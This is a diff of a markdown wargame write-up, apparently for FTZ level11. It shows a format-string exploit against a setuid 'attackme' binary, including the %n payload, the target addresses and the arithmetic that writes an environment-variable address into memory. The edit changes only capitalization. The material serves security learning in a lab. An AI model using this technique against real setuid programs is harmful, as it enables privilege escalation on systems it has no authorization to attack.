@@ -65,15 +65,16 @@ Using address: 0xbfffe988
 [level11@ftz tmp]$ ./getenv
 SUPERDK's addr=0xbffff49d
 ```
-the attack code format   
+
+The attack code format   
 `/home/level11/attackme $(printf "AAAAAddress1BBBBAddress2")%8x%8x%8x%Value1c%n%Value2c%n`
 
 Address1 : \x10\x96\x04\x08(08049610)   
 Address2(Address+1) : \x12\x96\x04\x08(08049612)   
 
 0xbffff49d will be (Value2/Value1) cuz this will be inverted when you input   
-value1 : f49d - 40 = 62621(f49d) - 40 = 62581   
-value2 : 1bfff-f49d = 114687(1bfff) - 62621(f49d) = 52066
+Value1 : f49d - 40 = 62621(f49d) - 40 = 62581   
+Value2 : 1bfff-f49d = 114687(1bfff) - 62621(f49d) = 52066
 
 So, the attack code is   
 `/home/level11/attackme $(printf "AAAA\x10\x96\x04\x08BBBB\x12\x96\x04\x08")%8x%8x%8x%62581c%n%52066c%n`
